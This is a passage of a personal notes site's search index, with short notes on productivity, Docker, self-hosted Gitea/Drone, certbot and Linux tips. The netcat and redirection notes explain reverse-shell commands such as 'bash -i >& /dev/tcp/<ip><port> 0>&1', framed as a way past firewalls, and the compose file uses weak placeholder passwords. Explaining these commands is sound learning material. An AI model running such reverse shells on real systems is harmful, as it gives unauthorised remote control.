turn off notifications of computers and phones1 1.2 write everything down","tags":["Tips","Productivity","GTD"],"title":"","uri":"https://kenmlai.me/notes/201911111605/","year":"2019"},{"content":"How to Improve Coding Skills  Code a lot. bring repetitive tasks into automation[[201911111605]], hobbies, and works etc. have focus on a few areas/languages learn the best practices and adhere to them ask questions look for cookbook/pocket references learn some computer science take some tutorials  Ref: 1\n  [[Code, Code, Code | PyDanny]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":27,"section":"notes","summary":"How to Improve Coding Skills  Code a lot. bring repetitive tasks into automation[[201911111605]], hobbies, and works etc. have focus on a few areas/languages learn the best practices and adhere to them ask questions look for cookbook/pocket references learn some computer science take some tutorials  Ref: 1\n  [[Code, Code, Code | PyDanny]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Programming"],"title":"","uri":"https://kenmlai.me/notes/201911111639/","year":"2019"},{"content":"Key Points of Writing a Clear Note When writing a note, it\u0026rsquo;s critical to make it simple and clear, because a note can be interpreted differently in different context, and even can\u0026rsquo;t be understood if the original context loses. A note is more of a reflection, idea, thought and understanding instead of a prose, the key points in the note should be able to capture whenever it is read afterwards.\nSome useful ways are:\n Write in simple text, preferably with a formal structure. Make the most important things first. A note is closed to useless if I need to go through a complex brain work to figure out what it talks about. Have a clear title directly about the content, which could be the final conclusion of the note. First sentence/paragraph should be a short description of the topic.  Ref: 1\n  [[How to Write a Note That You Will Actually Understand • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":28,"section":"notes","summary":"Key Points of Writing a Clear Note When writing a note, it\u0026rsquo;s critical to make it simple and clear, because a note can be interpreted differently in different context, and even can\u0026rsquo;t be understood if the original context loses. A note is more of a reflection, idea, thought and understanding instead of a prose, the key points in the note should be able to capture whenever it is read afterwards.","tags":["zettelkasten","Writing","Note"],"title":"","uri":"https://kenmlai.me/notes/201911102156/","year":"2019"},{"content":"Git server and CICD Platform at home With more and more software development projects I\u0026rsquo;ve been working for the last several years, I have thought about several things which drive me moving git repositories from one to another.:\n private repository support. Github didn\u0026rsquo;t support private repository for free tier users, I had to put those repositories in bitbucket and gitlab. CICD support. Services like Travis provide unlimited builds for public projects but require a lot for private repositories. The charging of the cost is reasonable but purchasing CICD services personally has never been a smart choice since I never write code regularly. Most of the build time would be wasted. Security issue. I won\u0026rsquo;t doubt my insufficiency of software skills and security senses in software. I may add a password file or include credentials in somewhere and mistakenly push them into a public repository. Political issues. Github bans countries, Gitlab bans new hires from China and Russia  For all the major reasons above and some trivial issues, I think a github service with a mature CICD platform is the elixir. After googling and comparing different solutions available, I finally choose Gitea and Drone for the following reasons:\n Both are lightweight, some features lacked have never been used by me for personal projects and research Both provide docker deployment officially, in which is perfect for rapid spinning up and down, fast migration and clean boundary between service and data. Raspberry PI is powerful enough to run both services. It may be a little slow to run a large test on PI, but it\u0026rsquo;s acceptable and can be easily add a new drone agent with more power.  System requirement \u0026amp; configuration 1  Gitea will listen port 22 for git over ssh, so the default need to be changed to another.  in /etc/ssh/sshd_config, change the port and restart the service and verify the service is running on the changed port.\n/etc/init.d/sshd restart ssh -p \u0026lt;new port\u0026gt; user@host  install docker and docker-compose  Service deployment  create docker-compose.yml file 12  version: \u0026quot;2\u0026quot; services: gitea: image: gitea/gitea:latest container_name: gitea-app environment: - USER_UID=1000 - USER_GID=1000 - ROOT_URL=http://\u0026lt;the server ip or domain name\u0026gt;:3000 - SSH_DOMAIN=mydomain.com - DB_TYPE=postgres - DB_HOST=db:5432 - DB_NAME=gitea - DB_USER=gitea - DB_PASSWD=gitea restart: always volumes: - ./volumes/gitea_app:/data ports: - \u0026quot;3000:3000\u0026quot; - \u0026quot;22:22\u0026quot; networks: - appnet gitea-db: image: postgres:alpine container_name: gitea-db ports: - 5440:5432 restart: always volumes: - ./volumes/gitea_db:/var/lib/postgresql/data environment: - POSTGRES_USER=gitea - POSTGRES_PASSWORD=gitea - POSTGRES_DB=gitea networks: - appnet drone-server: image: drone/drone:0.8 container_name: drone-server ports: - 80:8000 - 9000 volumes: - ./volumes/drone:/var/lib/drone/ restart: always depends_on: - gitea environment: - DRONE_OPEN=true - DRONE_HOST=http://drone-server:8000 - DRONE_GITEA=true - DRONE_GITEA_URL=http://gitea:3000 - DRONE_SECRET=secret - DRONE_NETWORK=appnet networks: - appnet drone-agent: image: drone/agent:0.8 container_name: drone-agent command: agent restart: always depends_on: - drone-server volumes: - /var/run/docker.sock:/var/run/docker.sock environment: - DRONE_SERVER=drone-server:9000 - DRONE_SECRET=secret networks: - appnet volumes: gitea-app: gitea-db: networks: appnet: external: true  create folder for data  in the same folder which contains the docker-compose.yml file\nmkdir volumes  create docker network  docker network create appnet  the whole system has been properly configured and can be simply booted up by\ndocker-compose up -d    [[Self Hosted Git and CICD Platform with Gitea and Drone on Docker]] \u0026#x21a9;\u0026#xfe0e;\n [[Installation with Docker - Docs]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":29,"section":"notes","summary":"Git server and CICD Platform at home With more and more software development projects I\u0026rsquo;ve been working for the last several years, I have thought about several things which drive me moving git repositories from one to another.:\n private repository support. Github didn\u0026rsquo;t support private repository for free tier users, I had to put those repositories in bitbucket and gitlab. CICD support. Services like Travis provide unlimited builds for public projects but require a lot for private repositories.","tags":["Docker","git","Gitea","CICD","HomeBuild","RaspberryPI","docker","git","cicd","homebuild","gitea","raspberrypi"],"title":"","uri":"https://kenmlai.me/notes/201911081421/","year":"2019"},{"content":"Fragile \u0026amp; Robust Nassim Taleb\u0026rsquo;s three-concept model includes:\n Fragile, means something doesn\u0026rsquo;t tolerate variability. Robust, which is NOT the opposite of fragile in his model, means something that doesn\u0026rsquo;t change with variability Anti-fragile, the opposite of fragile in the context, means improvement with variability.  A system can be easily determined by bring new variables into it:\n if the system\u0026rsquo;s performance, stability, reliability or etc. decreases, it\u0026rsquo;s fragile if the system remains the same, it\u0026rsquo;s robust if the system improves overall, it\u0026rsquo;s anti-fragile  Ref: 1\n  [[Nassim Taleb would love the Zettelkasten Method • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":30,"section":"notes","summary":"Fragile \u0026amp; Robust Nassim Taleb\u0026rsquo;s three-concept model includes:\n Fragile, means something doesn\u0026rsquo;t tolerate variability. Robust, which is NOT the opposite of fragile in his model, means something that doesn\u0026rsquo;t change with variability Anti-fragile, the opposite of fragile in the context, means improvement with variability.  A system can be easily determined by bring new variables into it:\n if the system\u0026rsquo;s performance, stability, reliability or etc. decreases, it\u0026rsquo;s fragile if the system remains the same, it\u0026rsquo;s robust if the system improves overall, it\u0026rsquo;s anti-fragile  Ref: 1","tags":["Reflection","Fragile","Robust"],"title":"","uri":"https://kenmlai.me/notes/201911081703/","year":"2019"},{"content":"Marking when Reading is rarely useful I used to mark \u0026amp; highlight a lot while reading with both physical and digital books. I once thought this was a very efficient way to help me to remember, understand, and then I can quickly pick them up whenever I want, digital marking is even more convenient by bringing in highlight management and search ability.\nAll of my ideas were wrong!\n Highlighting and marking don\u0026rsquo;t magically make me remember anything.1 Marking is simply an alternative of quoting. It\u0026rsquo;s quick, but help me skip the procedure of understanding which is slow. I\u0026rsquo;ve never been able to pick anything up. Since marking doesn\u0026rsquo;t organise and link information and transfer it into knowledge, all marks are forgotten swiftly. No way I can remember anything until I experience it several times, this is not I want. Searching for marks is just a fancy way of quoting if no understanding follows.  After the study of zettelkasten[[201910022111]], I treat marks and highlights as anchors, where I can quickly trace things back by them after I read my zettel. Nothing more. All marks are not directly quoted but are summarised or paraphrased with my own understanding.\n  [[Making Proper Marks in Books • Zettelkasten Method]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":31,"section":"notes","summary":"Marking when Reading is rarely useful I used to mark \u0026amp; highlight a lot while reading with both physical and digital books. I once thought this was a very efficient way to help me to remember, understand, and then I can quickly pick them up whenever I want, digital marking is even more convenient by bringing in highlight management and search ability.\nAll of my ideas were wrong!\n Highlighting and marking don\u0026rsquo;t magically make me remember anything.","tags":["zettelkasten","Writing","Study","Reading","Marking"],"title":"","uri":"https://kenmlai.me/notes/201911081833/","year":"2019"},{"content":"redirection in Linux Redirections in Linux can be interpreted as following:\n Redirections are run from left to right. \u0026gt; is similar to =, which is an assignment \u0026amp; is close to $ in bash, which indicates variables  For the example in [[201911041338]],\nbash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt; 0\u0026gt;\u0026amp;1  Here are three parts:\n bash -i which is the command to launch new shell \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt;, which redirects the stdout of 1 to /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt; as the stdin 0\u0026gt;\u0026amp;1 redirects the stdin as the stdout  The process steps are shown as following:\nInitial status of bash -i 0=stdin 1=stdout\nafter \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt;\n0=stdin 1=(stdin of) /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt; (the stdin is default)\nafter 0\u0026gt;\u0026amp;1\n0=(stdout of) /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt; 1=(stdin of) /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt;\nRef: 1 2\n  [[bash - Order of redirections - Unix \u0026amp; Linux Stack Exchange]] \u0026#x21a9;\u0026#xfe0e;\n [[shell - What does \u0026ldquo;3\u0026gt;\u0026amp;1 1\u0026gt;\u0026amp;2 2\u0026gt;\u0026amp;3\u0026rdquo; do in a script? - Unix \u0026amp; Linux Stack Exchange]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":32,"section":"notes","summary":"redirection in Linux Redirections in Linux can be interpreted as following:\n Redirections are run from left to right. \u0026gt; is similar to =, which is an assignment \u0026amp; is close to $ in bash, which indicates variables  For the example in [[201911041338]],\nbash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt; 0\u0026gt;\u0026amp;1  Here are three parts:\n bash -i which is the command to launch new shell \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt;, which redirects the stdout of 1 to /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt; as the stdin 0\u0026gt;\u0026amp;1 redirects the stdin as the stdout  The process steps are shown as following:","tags":["Linux","Redirection"],"title":"","uri":"https://kenmlai.me/notes/201911051527/","year":"2019"},{"content":"About Productivity, Efficacy and Efficiency Nick stated productivity as \u0026ldquo;having a shippable product\u0026rdquo;, and efficacy as generating something \u0026ldquo;useful”1, which I interpret differently.\nI think Nick combine the definitions of productivity and effectiveness as a whole to illustrate his idea, but I\u0026rsquo;d like to keep them separate. Here\u0026rsquo;s the definitions for those three words:\n Efficiency: How many things can be done in a period, which are not necessarily influential? Effectiveness: How influential a work can be (in the future)? Productivity: How effective in a period?  Productivity has compound meanings which measure the number of jobs can be done and the influence to the future. I also prioritise efficacy over efficiency a lot in productivity since the works are meaningless if they don\u0026rsquo;t shift the future in a better way.\n  [[Your Knowledge Base as a Wiki — Hack / Make]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":33,"section":"notes","summary":"About Productivity, Efficacy and Efficiency Nick stated productivity as \u0026ldquo;having a shippable product\u0026rdquo;, and efficacy as generating something \u0026ldquo;useful”1, which I interpret differently.\nI think Nick combine the definitions of productivity and effectiveness as a whole to illustrate his idea, but I\u0026rsquo;d like to keep them separate. Here\u0026rsquo;s the definitions for those three words:\n Efficiency: How many things can be done in a period, which are not necessarily influential? Effectiveness: How influential a work can be (in the future)?","tags":["Reflection","Productivity","productivity","reflection","Efficiency","Efficacy","Effective","Effectiveness","efficiency","efficacy","effective","effectiveness"],"title":"","uri":"https://kenmlai.me/notes/201911041311/","year":"2019"},{"content":"netcat Tips nc 是Linux系统中非常强大的网络工具，可以轻松实现对主机的嗅探和简单但强大的C\u0026amp;C服务器\nnc版本 nc有多个不同的版本：\n netcat-tradional。最早的版本，Kali Linux中默认的版本。有 -e 选项用作反弹shell。12 netcat-openbsd。Ubuntu中默认的版本，没有-e选项。1 2 ncat. Nmap作者重写的版本，Centos、RedHat默认版本，已经集成在nmap中。1 2 socat. 支持SSL/TLS，与原版很大不同。2 cryptcat. 使用twofish加密传输。2 sbd. Secure BackDoor. 带加密。2 netrw。针对文件传输做了加强，带文件校验以防止篡改。2  常见应用场景 建立连接 1 2 服务器端\n-l 监听模式。第一种nc版本需要启用-p来指定监听端口。\nncat -l \u0026lt;port\u0026gt;  客户端\nncat \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt;  连接成功后，两端可以进行进行文字交流。此时连接是基于TCP协议，如果需要UDP协议，可以在两端都使用-u参数。\n基本方式 1 2 -e 将传入信息发送到指定的程序中执行\n以下命令将监听本地端口，将收到的信息发送到/bin/bash中执行。客户端只需要按以往方式连接即可将指令发送到远端，同时获取执行结果\nncat -l -e /bin/bash \u0026lt;port\u0026gt;  持续监听 1\n-k 客户端断开时，服务器继续运行\nncat -lk -e /bin/bash \u0026lt;port\u0026gt;  这种方式的最大问题是，服务器往往处于内网中，防火墙默认拒绝所有外来连接。所以实用性并不高。\n反弹shell 1 2 将服务器和客户端的角色调转，发送命令者为服务器，接收命令者定期连接指定地址和端口来接收命令。这样可以一定程度规避防火墙的默认策略。\n外网命令发起者\nncat -l \u0026lt;port\u0026gt;  内网命令接受者\n-w 等待连接的时间（秒）\nncat -w 10 -e /bin/bash \u0026lt;ip/domain\u0026gt; \u0026lt;port\u0026gt;  不支持e选项的反弹shell 外网命令发起者\n如果是ncat\nncat -l \u0026lt;port\u0026gt;  如果是第二类nc（不带-e选项的版本）\nnc -lp \u0026lt;port\u0026gt;  内网命令接收端\nbash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ip\u0026gt;\u0026lt;port\u0026gt; 0\u0026gt;\u0026amp;1  上述命令将bash和tcp连接关联起来[[201911051527]]\n文件传输 1 2 文件接收端\nncat -l 2333 \u0026gt; hello.txt  文件发送端\nncat www.sqlsec.com 2333 \u0026lt; hello.txt  或者采用相反的方式也可以传输\n文件接收端\nncat www.sqlsec.com 2333 \u0026gt; hello.txt  文件发送端\nncat -l 2333 \u0026lt; hello.txt  这里ncat只是建立连接，发送和接收全部在于重定向的方向。\n如果使用dd命令，可以直接实现远程复制磁盘。由于nc没有应用层协议，所以在大量文件处理传输时相比应用层协议由巨大优势2\n端口扫描1 2 只有原始版本的nc支持扫描（上文提到的第一种nc）。也可以用于判断某个端口是否可达。\n-n 使用ip地址，不用DNS -z 只扫描而不发送任何数据\nnc -n -z 10.211.55.14 20-25 nc -n -z 10.211.55.14 80  如果需要测试UDP协议，要指定-u选项2。-w可以设定超时时间，否则需要长时间等待2。\n使用代理服务器2 openbsd版本nc可以使用-x和-X来设定代理服务器来进行连接，其中-X指定代理服务器类型，-x表明IP地址和端口。\nnc -X 5 -x 127.0.0.1:9050 -q 3 -v program-think.blogspot.com 443  端口转发2 mkfifo nc_pipe nc -l -p 1234 \u0026lt; nc_pipe | nc 127.0.0.1 5678 \u0026gt; nc_pipe  这样本地的1234和5678端口的数据就能实现互通。\n  [[nc命令学习记录]] \u0026#x21a9;\u0026#xfe0e;\n [[扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵” @ 编程随想的博客]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":34,"section":"notes","summary":"netcat Tips nc 是Linux系统中非常强大的网络工具，可以轻松实现对主机的嗅探和简单但强大的C\u0026amp;C服务器 nc版本 nc有多个不同的版本： netc","tags":["Linux","Tips","tips","netcat","nc"],"title":"","uri":"https://kenmlai.me/notes/201911041338/","year":"2019"},{"content":"Let\u0026rsquo;s Encrypt with Gunicorn  Install certbot1  sudo apt-get install software-properties-common sudo add-apt-repository ppa:certbot/certbot sudo apt-get update sudo apt-get install certbot  There\u0026rsquo;s a notification while adding repository which shows the repository is for Debian, and needs your confirmation before adding it. We can follow the link in the notification to check it supports certain version of Ubuntu or not.\ngenerate keys by using dns challenging in manual mode. Gunicorn doesn\u0026rsquo;t support accessing a local file from web by redirecting a certain URL, so http, in default, challenge doesn\u0026rsquo;t work. We don\u0026rsquo;t need to set the webroot since the key files are not automatically stored in it for the challenge later. Using the following command to generate keys.2  sudo certbot certonly --manual -d \u0026lt;domain name\u0026gt; --preferred-challenges dns  set up TXT recording for challenge. During last step, certbot requires a DNS TXT record to be set before moving on. Set the TXT record accordingly and check its availability manually3.  dig -t txt \u0026lt;challenge domain\u0026gt;  copy generated pem files under `/etc/letsencrypt/live/to start gunicorn with following parameters4  --keyfile \u0026quot;privkey.pem\u0026quot; --certfile \u0026quot;cert.pem\u0026quot; --ca_certs \u0026quot;chain.pem\u0026quot;    [[Running Your Flask Application Over HTTPS - miguelgrinberg.com]] \u0026#x21a9;\u0026#xfe0e;\n [[User Guide — Certbot 0.40.0.dev0 documentation]] \u0026#x21a9;\u0026#xfe0e;\n [[Linux command to inspect TXT records of a domain - Server Fault]] \u0026#x21a9;\u0026#xfe0e;\n [[ssl - Setup Gunicorn with let\u0026rsquo;s encrypt cert - Stack Overflow]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":35,"section":"notes","summary":"Let\u0026rsquo;s Encrypt with Gunicorn  Install certbot1  sudo apt-get install software-properties-common sudo add-apt-repository ppa:certbot/certbot sudo apt-get update sudo apt-get install certbot  There\u0026rsquo;s a notification while adding repository which shows the repository is for Debian, and needs your confirmation before adding it. We can follow the link in the notification to check it supports certain version of Ubuntu or not.\ngenerate keys by using dns challenging in manual mode. Gunicorn doesn\u0026rsquo;t support accessing a local file from web by redirecting a certain URL, so http, in default, challenge doesn\u0026rsquo;t work.","tags":["Linux","linux","gunicorn","SSL","HTTPS","Ubuntu","ubuntu","gunicorn","ssl","https"],"title":"","uri":"https://kenmlai.me/notes/201911031233/","year":"2019"},{"content":"Systematic Study 系统性学习是能够客观上提高自身水平的唯一方式，所谓的系统性体现在理解相应领域的知识体系，并排除掉体系内的系列的知识盲点；而学习则不限于一般意义上的输入行为：读和听，更包含了输出以及实际练习。\n系统学习的两个维度可以用广度和深度来表示。根据目的不同，广度和深度需要作出相应的平衡。而系统学习的目的则在于理解吸收相应的观点和知识，对其有自身的理解。1\n如果把学习的媒介进行对比，阅读是最优的方式。这里的阅读是指具有一定深度和广度的书籍，或者对某一问题进行详细的讨论文章最佳。百科网站，问答网站，社交类网站，论坛之类的阅读本质上无法（/很难提供）提供具有深度的信息1。\n如果再把书籍进行分类，可以简单的分为：通俗、入门和专题三类[@C92F1F424EFE]。三类的广度由广及窄，深度则逐渐增加（广度指核心主题广度，而非相关内容广度）。在系统学习而言，专题内容应当占有非常大的比例(≥50%)，这有助于解决知识体系中的盲点。而需要快速掌握的内容则可以通过1-2本通俗或者入门书籍解决。\n费曼学习法源自物理学家Richard Feynman，其核心在于用最通俗易懂的方式将一个知识传递给原本完全不懂的人。这个过程中如果出现的问题体现了对于自身知识掌握中的问题。\n 不知道从何开始。这体现了对表述的知识没有系统认识，可以先建立对应的知识体系； 不知如何解释某一个具体内容。这通常是因为对应的体系中有知识盲点； 可以完整表述，但是无法做到外行人也能看懂的水平。这表明对于晦涩的知识点，并没有对本质有透彻的理解。    [[如何【系统性学习】——从“媒介形态”聊到“DIKW 模型” @ 编程随想的博客]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":36,"section":"notes","summary":"Systematic Study 系统性学习是能够客观上提高自身水平的唯一方式，所谓的系统性体现在理解相应领域的知识体系，并排除掉体系内的系列的知识盲点；而学习则不限于一","tags":["Study","Systematic"],"title":"","uri":"https://kenmlai.me/notes/201911011038/","year":"2019"},{"content":"AWK Tips  awk is a line-based processing tool -F indicates separator of each column/field, which is space in default $0 means the entire row, $x means the xth column BEGIN{} 表示在处理数据之前的工作，可以用来打印表头 可以用3里面的表示来对每一列做逻辑判断，~是包含，!是否定，\u0026amp;\u0026amp;是与 END{} 显示处理完数据之后的工作，比如打印总结信息 printf和C语言使用方法相似  Ref: 1\n  [[换一种视角理解 awk 命令 | 小胡子哥的个人网站]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":37,"section":"notes","summary":"AWK Tips awk is a line-based processing tool -F indicates separator of each column/field, which is space in default $0 means the entire row, $x means the xth column BEGIN{} 表示在处理数据之前的工作，可以用来打印表头 可以用3里面的表示来对每一列做逻辑判断","tags":["Linux","Tips","awk"],"title":"","uri":"https://kenmlai.me/notes/201910311424/","year":"2019"},{"content":"Docker Tips  Any edit in a Dockerfile will cause re-builds of consequential steps, so put lines that rarely changes in front Avoid using COPY . to copy a whole folder, only copy files are needed to avoid rebuild when any file changes in the folder Too many RUN commands increase layers. Try to combine set steps into one. Don\u0026rsquo;t install any development/debug tools/packages for production, only install everything that is needed. like using --no-install-recommends with apt remove package cache use official images when possible: using python3.7 instead of ubuntu when the image is for a python app. use more specific tags, which show the version explicitly; also specify the minimal image when possible, install everything manually build from source in a consistent environment (use docker to build) fetch \u0026amp; install dependencies in a separate step use multi-stage builds to remove build dependencies (point 8 \u0026amp; 9)  Ref: 1\ndocker images can be manually moved to another host if both public and private registries aren\u0026rsquo;t able to be used. 2 3  on source\ndocker save myimage:latest | gzip \u0026gt; myimage_latest.tar.gz  on destination\ndocker load \u0026lt; myimage_latest.tar.gz  Remove containers. containers can be removed automatically if --rm is used with docker run, we can use the follow command to erase them4.  docker container prune  we can stop and erase all containers as well\ndocker container stop $(docker container ls -aq) docker container rm $(docker container ls -aq)  Get IP address of a container.5  Modern Docker\ndocker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container_name_or_id  Old Docker\ndocker inspect --format '{{ .NetworkSettings.IPAddress }}' container_name_or_id  customized function for shell6\nPop this into your ~/.bashrc (Linux) or ~/.bash_profile (Mac)\ndockip() { docker inspect --format '{{ .NetworkSettings.IPAddress }}' \u0026quot;$@\u0026quot; }    [[你确定你会写 Dockerfile 吗？ - 米开朗基杨的博客]] \u0026#x21a9;\u0026#xfe0e;\n [[docker save | Docker Documentation]] \u0026#x21a9;\u0026#xfe0e;\n [[docker load | Docker Documentation]] \u0026#x21a9;\u0026#xfe0e;\n [[小贴士：Docker清理作弊手册]] \u0026#x21a9;\u0026#xfe0e;\n [[How to get a Docker container\u0026rsquo;s IP address from the host? - Stack Overflow]] \u0026#x21a9;\u0026#xfe0e;\n 10 Examples of how to get Docker Container IP Address \u0026#x21a9;\u0026#xfe0e;\n   ","id":38,"section":"notes","summary":"Docker Tips Any edit in a Dockerfile will cause re-builds of consequential steps, so put lines that rarely changes in front Avoid using COPY . to copy a whole folder, only copy files are needed to avoid rebuild when any file changes in the folder Too many RUN commands increase layers. Try to combine set steps into one. Don\u0026rsquo;t install any development/debug tools/packages for production, only install everything that is","tags":["Docker","Linux","Tips","tips","docker","linux"],"title":"","uri":"https://kenmlai.me/notes/201910311448/","year":"2019"},{"content":"Photo Shooting by Mobile Phones   广角镜头有明显的畸变：画面边缘会被拉升，而中心会被压缩\n 拍全身人像时应让腿部靠近边缘，脸部在中心 在拍建筑/风景时，放在中心可以显示其对周围环境的渺小，放在边缘可以显得其宏伟 要突出主题  减少不必要内容 构图引导注意力  用景物构成画框 用前景增加层次感        标准焦距镜头畸变可以忽略\n 适合半身像 可以减少进入画面的内容    Ref: 1\n  [[40000 字、100 张配图，教你如何用 iPhone 拍出好照片 \u0026amp; 视频：iPhone 相机完全操作指南 2.0 - 少数派]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":39,"section":"notes","summary":"Photo Shooting by Mobile Phones 广角镜头有明显的畸变：画面边缘会被拉升，而中心会被压缩 拍全身人像时应让腿部靠近边缘，脸部在中心 在拍建筑/风景时，放在中心可以显示其","tags":["Tips","Phones","Photos"],"title":"","uri":"https://kenmlai.me/notes/201910292022/","year":"2019"},{"content":"Enable DHCP Server on Mac There\u0026rsquo;s a build-in DHCP server on Mac, which can be enabled with following steps1:\n create /etc//bootpd.plist, content refers 1 config IP address on the interface which will be enabled the DHCP service launch DHCP service by using  sudo /usr/libexec/bootpd -Ddv    [[macOS开启DHCP Server - 简书]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":40,"section":"notes","summary":"Enable DHCP Server on Mac There\u0026rsquo;s a build-in DHCP server on Mac, which can be enabled with following steps1: create /etc//bootpd.plist, content refers 1 config IP address on the interface which will be enabled the DHCP service launch DHCP service by using sudo /usr/libexec/bootpd -Ddv [[macOS开启DHCP Server - 简书]] \u0026#x21a9;\u0026#xfe0e;","tags":["Mac","DHCP","MacOS"],"title":"","uri":"https://kenmlai.me/notes/201910292109/","year":"2019"},{"content":"Advantages of Using Containers  It provides better isolation/decoupling among other services.  One bite a time. Bug isolation.   It enables develops achieve expectations without worrying about processes in middle 1  Offload repetitive jobs      [[2018 年度小结（技术方面） | 王子亭的博客]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":41,"section":"notes","summary":"Advantages of Using Containers It provides better isolation/decoupling among other services. One bite a time. Bug isolation. It enables develops achieve expectations without worrying about processes in middle 1 Offload repetitive jobs [[2018 年度小结（技术方面） | 王子亭的博客]] \u0026#x21a9;\u0026#xfe0e;","tags":["Docker","Tips","tips","docker","Container","Kubernetes","container","kubernetes"],"title":"","uri":"https://kenmlai.me/notes/201910281148/","year":"2019"},{"content":"What is Hard Working? Hard working is the job done with the best performance in terms of expense, time, labor, standardized and etc. Hence, for the same outcome1, whoever brings more effectiveness and efficiency is working hard instead of who simply spends more time.\nWe never promote a mule even it has been working for grinding all its life.\n  [[Hard work | Seth\u0026rsquo;s Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":42,"section":"notes","summary":"What is Hard Working? Hard working is the job done with the best performance in terms of expense, time, labor, standardized and etc. Hence, for the same outcome1, whoever brings more effectiveness and efficiency is working hard instead of who simply spends more time.\nWe never promote a mule even it has been working for grinding all its life.\n  [[Hard work | Seth\u0026rsquo;s Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Reflection","reflection","Career","career"],"title":"","uri":"https://kenmlai.me/notes/201910281209/","year":"2019"},{"content":"VirtualBox Mount Shared Folder Similar to [[201910241123]], the shared folder may not work in a guest machine.\nThe issue can be solved by using the following command:1\nsudo mount -t vboxsf shared ~/shared  if we want to mount the folder as other users, we can specify the user and group ids\nsudo mount -t vboxsf -o uid=1000,gid=1000 shared ~/shared    [[Mounting VirtualBox shared folders on Ubuntu Server 16.04 LTS]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":43,"section":"notes","summary":"VirtualBox Mount Shared Folder Similar to [[201910241123]], the shared folder may not work in a guest machine.\nThe issue can be solved by using the following command:1\nsudo mount -t vboxsf shared ~/shared  if we want to mount the folder as other users, we can specify the user and group ids\nsudo mount -t vboxsf -o uid=1000,gid=1000 shared ~/shared    [[Mounting VirtualBox shared folders on Ubuntu Server 16.","tags":["Linux","Virtualization","VirtualBox"],"title":"","uri":"https://kenmlai.me/notes/201910261933/","year":"2019"},{"content":"Unmount Busy Devices If it\u0026rsquo;s reported busy when trying to unmount a device in Linux, we can use following commands to do so forcefully1:\numount -l /PATH/OF/BUSY-DEVICE umount -f /PATH/OF/BUSY-NFS(NETWORK-FILE-SYSTEM)    [[lvm - umount: /: target is busy - Ask Ubuntu]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":44,"section":"notes","summary":"Unmount Busy Devices If it\u0026rsquo;s reported busy when trying to unmount a device in Linux, we can use following commands to do so forcefully1:\numount -l /PATH/OF/BUSY-DEVICE umount -f /PATH/OF/BUSY-NFS(NETWORK-FILE-SYSTEM)    [[lvm - umount: /: target is busy - Ask Ubuntu]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Linux","Tips","Ubuntu"],"title":"","uri":"https://kenmlai.me/notes/201910261943/","year":"2019"},{"content":"VMWare Fusion 10 Mount Shared Folder The shared folder feature of VMWare Fusion 10 on MacOS doesn\u0026rsquo;t work as the shared folder doesn\u0026rsquo;t show up in the guest system, especially in Linux systems.\nThe issue can be solved by manually run the following command:1\nsudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other  or add an entry in the /etc/fstab\nvmhgfs-fuse /mnt/hgfs fuse defaults,allow_other 0 0  A similar issue happens in VirtualBox, which can be solved by [[201910261933]]\n  https://github.com/vmware/open-vm-tools/issues/199 \u0026#x21a9;\u0026#xfe0e;\n   ","id":45,"section":"notes","summary":"VMWare Fusion 10 Mount Shared Folder The shared folder feature of VMWare Fusion 10 on MacOS doesn\u0026rsquo;t work as the shared folder doesn\u0026rsquo;t show up in the guest system, especially in Linux systems.\nThe issue can be solved by manually run the following command:1\nsudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other  or add an entry in the /etc/fstab\nvmhgfs-fuse /mnt/hgfs fuse defaults,allow_other 0 0  A similar issue happens in VirtualBox, which can be solved by [[201910261933]]","tags":["Linux","Virtualization","VMWare"],"title":"","uri":"https://kenmlai.me/notes/201910241123/","year":"2019"},{"content":"Startup Points on MacOS There are several locations that can be registered by applications for automatically launching when the system boot up:\nApplication related:\n System Preferences -\u0026gt; Users \u0026amp; Groups -\u0026gt; Login Items 1 /Library/StartUpItems 1 2 /Library/LaunchDaemons 1 2 /Library/LaunchAgents 1 2 /Users/username/Library/LaunchAgents 2  System related:\n /System/Library/LaunchDaemons 1 2 /System/Library/LaunchAgents 1 2 /System/Library/StartupItems 2  Some applications may register themselves as system related services, especially those working stealthy.\n  [[How to remove startup programs in macOS Mojave and earlier OS X?]] \u0026#x21a9;\u0026#xfe0e;\n [[Take control of startup and login items | Macworld]] 